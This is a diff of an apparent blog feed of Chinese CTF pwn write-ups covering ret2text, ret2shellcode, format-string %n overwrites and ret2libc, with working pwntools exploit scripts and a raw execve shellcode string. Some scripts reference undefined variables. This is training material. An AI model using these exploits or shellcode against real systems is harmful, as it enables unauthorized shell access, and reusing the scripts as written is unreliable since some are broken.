+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Week4-amp-amp-Week5-T1-jarvisoj-level0"><a href="#Week4-amp-amp-Week5-T1-jarvisoj-level0" class="headerlink" title="Week4&amp;&amp;Week5 T1  jarvisoj_level0"></a>Week4&amp;&amp;Week5 T1  jarvisoj_level0</h2><p>2023-01-20WP<br>BUUCTF pwn 第六题<br>考点： 简单栈溢出&#x2F;基本rop ret2text</p>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec —— 64-bit，开NX</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看发现main函数里的vulnerable_function()函数里的read函数读取0x200ull，而buf空间只有0x80<br>又找到有system(“&#x2F;bin&#x2F;sh”)<br>返回其地址</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>exp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,29175)</span><br><span class="line">ret_arr = 0X40059A</span><br><span class="line">payload = b&#x27;a&#x27;*(0x80 + 0x8) + p64(ret_arr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>wp</category>
       </categories>
@@ -88,78 +376,39 @@
       </tags>
   </entry>
   <entry>
-    <title>week4&amp;&amp;week5-T4</title>
-    <url>/posts/e234b4c5/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2libc3"><a href="#T4-ret2libc3" class="headerlink" title="T4 ret2libc3"></a>T4 ret2libc3</h2><blockquote>
-<p>2021-01-30WP<br>ctf-wiki ret2libc3<br>考点：栈溢出rop</p>
+    <title>week3 T4</title>
+    <url>/posts/8952815d/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2shellcode-2-栈写入"><a href="#T4-ret2shellcode-2-栈写入" class="headerlink" title="T4 ret2shellcode 2 (栈写入)"></a>T4 ret2shellcode 2 (栈写入)</h2><blockquote>
+<p>2023-01-15WP<br>sniperoj-pwn100-shellcode<br>考点：栈溢出 shellcode</p>
 </blockquote>
 <span id="more"></span>
 
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这个是真的难……  首先得透彻理解got和plt，其次还得对exp的写作要有一定的熟练度，而且还有各种各样古怪的写法…… 现在我还很多地方琢磨不清楚，只是依葫芦画瓢地复盘了一下，现在这篇题解只是写个大框架，具体细节后面慢慢补充了……</p>
-<p>file checksec —— 32-bit 开NX</p>
-<p><img data-src="https://pic2.zhimg.com/80/v2-39081f4041a6adc22d72564532642699_1440w.webp"></p>
-<p>漏洞和内存分析和之前的系列题类似，不赘述了</p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，既没有system也没有binsh </p>
-<p><img data-src="https://img-blog.csdnimg.cn/fe4f5738bcd04e6fbe3cd80ed056f189.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
-<p>由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知<br>不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）<br>而现在我们有一个puts函数，libc中也有system和binsh</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和&#x2F;bin&#x2F;sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可<br>我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -search的网站</a>查询，可得到puts函数system函数和binsh字符串对应的偏移地址</p>
-<p><img data-src="https://img-blog.csdnimg.cn/66db2c69d62a4149868ab50a5c933698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>（这里直接盗图了……）</p>
-<p>知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，&#x2F;bin&#x2F;sh字符串的偏移相加，就可以得到对应的真实地址<br>然后写完整的exp </p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和&#x2F;bin&#x2F;sh的地址，拿到shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#first exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;ret2libc3&#x27;)</span><br><span class="line">p=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line">print(&quot;puts addr = &quot;, hex(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#second exp</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(&quot;puts_addr = &quot;,hex(puts_addr))</span><br><span class="line">sys_offset = 0x03cd10</span><br><span class="line">puts_offset = 0x067360</span><br><span class="line">sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算</span><br><span class="line">libc_base_addr = puts_addr - puts_offset #计算出libc基地址</span><br><span class="line">sys_addr = libc_base_addr + sys_offset #计算出system的真实地址</span><br><span class="line">sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址</span><br><span class="line"></span><br><span class="line">print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))</span><br><span class="line">print(&quot;sys_addr = &quot;,hex(sys_addr))</span><br><span class="line">print(&quot;sh_addr = &quot;,hex(sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>还有其他几种方法目前没用搞懂<br>之后学会了（看懂了）再写过<br><strong>问</strong>：</p>
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file ,checksec检查保护机制<br><img data-src="https://pic2.zhimg.com/80/v2-93af3c284b45a8b1bc9b8d234218d6b9_1440w.webp"><br>开启了PIE  地址变换</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA中看看源码<br><img data-src="https://pic1.zhimg.com/80/v2-1dda406b44f40e076971774458e5d654_1440w.webp"><br>发现已经有输出了buf的地址，因此随机化地址便可以进行绕过<br>继续分析发现read函数读入0x40字节，而buf分配的空间才0x10字节，存在栈溢出<br>打开string window，没有system和&#x2F;bin&#x2F;sh，应该是要写入shellcode了</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>先看看我们的空间能不能写下shellcode这里main函数里声明的buf只有0x10即16字节，属于局部变量，空间分配在栈上<br>gdb动态调试，（其实IDA能看出来，就是不确定对不对就是了）<br><img data-src="https://img-blog.csdnimg.cn/img_convert/3bcd85545cf60cac9b4aefb0eee24d1b.png"><br>我们计算buf的偏移量为rbp - rsp  &#x3D; 0x7fffde3d2820 - 0x7fffde3d2810 &#x3D; 10，再加上rbp 8字节为0x18即24字节</p>
+<p>而我们用shellcraft生成的shellcode时44字节的，显然已经超过了<br>于是我们想找一个长度较小的shellcode来写入，但是由于某些我还没搞很懂的原因，我们必须要将把shellcode放在返回<br>地址的后面<br>那放在后面的话是不是44字节的shellcode就可以使用了呢？其实也不行，要注意到read函数是读取0x40字节的，这就使得读取的字符串长度有一定的限制。这0x40字节的数据，既要包括填充的垃圾数据，也要包括shellcode的返回地址和shellcode的内容，我们还得计算一下允许的shellcode的长度<br>0x40 - ( 0x10 + 8 ) - 8 &#x3D; 32<br>（0x10+8）为造成溢出填充的垃圾数据，后面8为是shellcode地址的长度，所以构建的shllcode必须在32以内<br>之前使用的shellcraft.sh()生成的shellcode有44字节，在这里只有32字节，因此并不适用</p>
 <blockquote>
-<p>p.recv()[0:4]和p.recv(4）的区别？？<br>网上没搜到<br>要在本地打通是不是要对libc做什么操作呀</p>
+<p>shellcode&#x3D;”\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</p>
 </blockquote>
-<p>参考资料：<br>  <a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc</a><br>  <a href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3</a><br>  <a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichen二进制安全</a></p>
+<p>一个找shellcode的网站</p>
+<blockquote>
+<p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a><br><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a> </p>
+</blockquote>
+<p>这个shellcode只有23个字节，短小精悍，适合放在栈中去执行</p>
+<p>写exp (发现一个地方：就是正常python代码不能在开头留空格)</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">addr = p.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Now give me your answer&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p64(<span class="built_in">int</span>(addr,<span class="number">16</span>)+<span class="number">32</span>) + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里我们只知道一个确定的buf的addr，shellcode的地址要从buf的地址推出来，也就是int(addr,16)+32</p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>为什么不可以找一个长度小于24的shellcode直接写入buf中呢？而非要先填充buf再返回至写shellcode的地方呢？<br>在网上找到一个解释不知道对不对</p>
+<blockquote>
+<p>因为其本身是有push指令的，如果我们把shellcode放在返回地址的前面，在程序leave的时候会破坏shellcode，所以我们将其放在后面</p>
+</blockquote>
 ]]></content>
       <categories>
         <category>wp</category>
       </categories>
       <tags>
-        <tag>ctf ctf-wiki</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week4&amp;&amp;week5-T3</title>
-    <url>/posts/7c502166/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-第五空间2019-决赛-PWN5"><a href="#T3-第五空间2019-决赛-PWN5" class="headerlink" title="T3 [第五空间2019 决赛]PWN5"></a>T3 [第五空间2019 决赛]PWN5</h2><blockquote>
-<p>2023-01-27WP<br>BUUCTF pwn第七题<br>考点：格式化字符串漏洞</p>
-</blockquote>
-<span id="more"></span>
-
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file &amp;&amp; checksec —— 32 bit , 开启NX，开启cannary</p>
-<p><img data-src="https://pic3.zhimg.com/80/v2-9e3862844f2bd9655cfffdff011bd7da_1440w.webp"></p>
-<p>这就没法栈溢出了<br>运行程序看看输出</p>
-<p><img data-src="https://pic4.zhimg.com/80/v2-28662f39bf58b3e1ecc77bfbb48c1fab_1440w.webp"></p>
-<p>0x02</p>
-<p>IDA查看代码</p>
-<p><img data-src="https://pic2.zhimg.com/80/v2-33b5a588a4426ffce92591baff62ae05_1440w.webp"></p>
-<p>先找string window 发现&#x2F;bin&#x2F;sh，进一步查看发现程序就是先读取用户名，再读入密码，然后再将用户输入的密码和生成的一个随机密码比较，正确则执行system(&#x2F;bin&#x2F;sh)，错误则输出fail</p>
-<p>观察发现printf(&amp;buf);存在格式化字符串漏洞</p>
-<p>（关于格式化字符串漏洞的相关知识会另写一篇）</p>
-<p>0x03</p>
-<p>现在可以利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据就好了 </p>
-<p>首先利用测试数据”AAAA %08x %08x %08x %08x %08x %08x %08x………… “来确定偏移量，</p>
-<p><img data-src="https://pic4.zhimg.com/80/v2-13630a4e96f63372c3c048636423b0eb_1440w.webp"></p>
-<p>发现输入的数据是栈的第十个</p>
-<p>并且存放生成的随机密码的地址是从0x0804C044开始的，共四字节空间</p>
-<p>所以我们可以用%10$,%11$,%12$,%13$去定位到这4个地址，再用%n修改这些地址里的内容 </p>
-<p><img data-src="https://pic2.zhimg.com/80/v2-4c6e49700dcdd067c211a07e233208e9_1440w.webp"></p>
-<p>可以构造payload了</p>
-<p>0x04</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">    </span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28332)</span><br><span class="line">    </span><br><span class="line">addr = 0x804c044</span><br><span class="line">    </span><br><span class="line">payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)</span><br><span class="line">payload+=b&#x27;%10$n%11$n%12$n%13$n&#x27;</span><br><span class="line">    </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(str(0x10101010))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>因为总共输入了四个地址，共16位，所以%n所赋值的数是16，所以用户输入密码时发送的数据为0x10101010</p>
-]]></content>
-      <categories>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf BUUCTF</tag>
+        <tag>ctf</tag>
+        <tag>ctf-wiki</tag>
       </tags>
   </entry>
   <entry>
@@ -239,6 +488,168 @@
       </tags>
   </entry>
   <entry>
+    <title>week4&amp;&amp;week5-T3</title>
+    <url>/posts/7c502166/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-第五空间2019-决赛-PWN5"><a href="#T3-第五空间2019-决赛-PWN5" class="headerlink" title="T3 [第五空间2019 决赛]PWN5"></a>T3 [第五空间2019 决赛]PWN5</h2><blockquote>
+<p>2023-01-27WP<br>BUUCTF pwn第七题<br>考点：格式化字符串漏洞</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file &amp;&amp; checksec —— 32 bit , 开启NX，开启cannary</p>
+<p><img data-src="https://pic3.zhimg.com/80/v2-9e3862844f2bd9655cfffdff011bd7da_1440w.webp"></p>
+<p>这就没法栈溢出了<br>运行程序看看输出</p>
+<p><img data-src="https://pic4.zhimg.com/80/v2-28662f39bf58b3e1ecc77bfbb48c1fab_1440w.webp"></p>
+<p>0x02</p>
+<p>IDA查看代码</p>
+<p><img data-src="https://pic2.zhimg.com/80/v2-33b5a588a4426ffce92591baff62ae05_1440w.webp"></p>
+<p>先找string window 发现&#x2F;bin&#x2F;sh，进一步查看发现程序就是先读取用户名，再读入密码，然后再将用户输入的密码和生成的一个随机密码比较，正确则执行system(&#x2F;bin&#x2F;sh)，错误则输出fail</p>
+<p>观察发现printf(&amp;buf);存在格式化字符串漏洞</p>
+<p>（关于格式化字符串漏洞的相关知识会另写一篇）</p>
+<p>0x03</p>
+<p>现在可以利用%n来修改参数里的内容，我们不知道读入的随机数是多少，那么我们将它改成我们写入的数据就好了 </p>
+<p>首先利用测试数据”AAAA %08x %08x %08x %08x %08x %08x %08x………… “来确定偏移量，</p>
+<p><img data-src="https://pic4.zhimg.com/80/v2-13630a4e96f63372c3c048636423b0eb_1440w.webp"></p>
+<p>发现输入的数据是栈的第十个</p>
+<p>并且存放生成的随机密码的地址是从0x0804C044开始的，共四字节空间</p>
+<p>所以我们可以用%10$,%11$,%12$,%13$去定位到这4个地址，再用%n修改这些地址里的内容 </p>
+<p><img data-src="https://pic2.zhimg.com/80/v2-4c6e49700dcdd067c211a07e233208e9_1440w.webp"></p>
+<p>可以构造payload了</p>
+<p>0x04</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">    </span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,28332)</span><br><span class="line">    </span><br><span class="line">addr = 0x804c044</span><br><span class="line">    </span><br><span class="line">payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3)</span><br><span class="line">payload+=b&#x27;%10$n%11$n%12$n%13$n&#x27;</span><br><span class="line">    </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(str(0x10101010))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>因为总共输入了四个地址，共16位，所以%n所赋值的数是16，所以用户输入密码时发送的数据为0x10101010</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week4&amp;&amp;week5-T4</title>
+    <url>/posts/e234b4c5/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2libc3"><a href="#T4-ret2libc3" class="headerlink" title="T4 ret2libc3"></a>T4 ret2libc3</h2><blockquote>
+<p>2021-01-30WP<br>ctf-wiki ret2libc3<br>考点：栈溢出rop</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这个是真的难……  首先得透彻理解got和plt，其次还得对exp的写作要有一定的熟练度，而且还有各种各样古怪的写法…… 现在我还很多地方琢磨不清楚，只是依葫芦画瓢地复盘了一下，现在这篇题解只是写个大框架，具体细节后面慢慢补充了……</p>
+<p>file checksec —— 32-bit 开NX</p>
+<p><img data-src="https://pic2.zhimg.com/80/v2-39081f4041a6adc22d72564532642699_1440w.webp"></p>
+<p>漏洞和内存分析和之前的系列题类似，不赘述了</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA看源码，既没有system也没有binsh </p>
+<p><img data-src="https://img-blog.csdnimg.cn/fe4f5738bcd04e6fbe3cd80ed056f189.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>由linux延迟绑定机制的知识（后面再写一篇总结吧）可知，我们如果要调用system函数，就要知道他的got表中的地址，但libc被加载到的内存的位置是随机的，我们无法得知<br>不过，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址（got表地址）<br>而现在我们有一个puts函数，libc中也有system和binsh</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们只需要通过栈溢出利用puts函数，打印puts函数的got表中的地址，然后获取偏移，得到system函数和&#x2F;bin&#x2F;sh字符串的地址，再将puts函数的返回地址覆盖为system函数的地址即可<br>我们可以先运行exp1（见0x04）拿到获取puts的真实地址，然后去<a href="https://libc.blukat.me/?q=__libc_start_main_ret:e81">libc- database -search的网站</a>查询，可得到puts函数system函数和binsh字符串对应的偏移地址</p>
+<p><img data-src="https://img-blog.csdnimg.cn/66db2c69d62a4149868ab50a5c933698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6IuP55KD5Y-q5oOz5YiS5rC0,size_20,color_FFFFFF,t_70,g_se,x_16"><br>（这里直接盗图了……）</p>
+<p>知道了puts函数的真实地址和偏移之后，就可以将puts函数的真实地址减去偏移地址，得到libc的基址，将libc的基址分别与system，&#x2F;bin&#x2F;sh字符串的偏移相加，就可以得到对应的真实地址<br>然后写完整的exp </p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>所以其实exp是分两部的，第一步是构造栈溢出利用puts函数打印出真实地址；第二步是溢出覆盖至system函数和&#x2F;bin&#x2F;sh的地址，拿到shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#first exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;ret2libc3&#x27;)</span><br><span class="line">p=process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line">start_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">payload1=b&#x27;A&#x27;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;!?&quot;,payload1)</span><br><span class="line">puts_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line">print(&quot;puts addr = &quot;, hex(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#second exp</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line">elf = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_got_addr = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt_addr = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">main_plt_addr = elf.symbols[&#x27;_start&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;puts_got_addr = &quot;,hex(puts_got_addr))</span><br><span class="line">print(&quot;puts_plt_addr = &quot;,hex(puts_plt_addr))</span><br><span class="line">print(&quot;main_plt_addr = &quot;,hex(main_plt_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(&quot;puts_addr = &quot;,hex(puts_addr))</span><br><span class="line">sys_offset = 0x03cd10</span><br><span class="line">puts_offset = 0x067360</span><br><span class="line">sh_offset = 0x17b8cf</span><br><span class="line"></span><br><span class="line">#根据公式  libc基地址  +  函数偏移量   =  函数真实地址   来计算</span><br><span class="line">libc_base_addr = puts_addr - puts_offset #计算出libc基地址</span><br><span class="line">sys_addr = libc_base_addr + sys_offset #计算出system的真实地址</span><br><span class="line">sh_addr = libc_base_addr + sh_offset #计算出/bin/sh的真实地址</span><br><span class="line"></span><br><span class="line">print(&quot;libc_base_addr = &quot;,hex(libc_base_addr))</span><br><span class="line">print(&quot;sys_addr = &quot;,hex(sys_addr))</span><br><span class="line">print(&quot;sh_addr = &quot;,hex(sh_addr))</span><br><span class="line"></span><br><span class="line">payload2 = flat([b&#x27;A&#x27;*112, p32(sys_addr), &quot;AAAA&quot;, p32(sh_addr)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>还有其他几种方法目前没用搞懂<br>之后学会了（看懂了）再写过<br><strong>问</strong>：</p>
+<blockquote>
+<p>p.recv()[0:4]和p.recv(4）的区别？？<br>网上没搜到<br>要在本地打通是不是要对libc做什么操作呀</p>
+</blockquote>
+<p>参考资料：<br>  <a href="https://blog.csdn.net/weixin_45943522/article/details/120469196">pwn小白入门06–ret2libc</a><br>  <a href="https://blog.csdn.net/AcSuccess/article/details/104335514">基本ROP之ret2libc3</a><br>  <a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#MsLuY">yichen二进制安全</a></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf ctf-wiki</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week4&amp;&amp;week5-T5</title>
+    <url>/posts/95338453/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-ciscn-2019-c-1"><a href="#T5-ciscn-2019-c-1" class="headerlink" title="T5 ciscn_2019_c_1"></a>T5 ciscn_2019_c_1</h2><blockquote>
+<p>2023-01-30WP<br>BUUCTF pwn 题<br>考点：栈溢出 ret2libc3</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这不上一题刚做这类？直接模仿一手。。。。<br>file checksec —— 64-bit 开NX</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>运行一下看看</p>
+<p><img data-src="https://pic1.zhimg.com/80/v2-8b7794a415c00fa88ea4eab73b44e060_1440w.webp"></p>
+<p>再看看IDA</p>
+<p><img data-src="https://img-blog.csdnimg.cn/2020082517155968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>研究了半天发现是让你加解密的<br>再看看string window 没用system和binsh<br>又发现加密函数里有gets函数，可构成栈溢出</p>
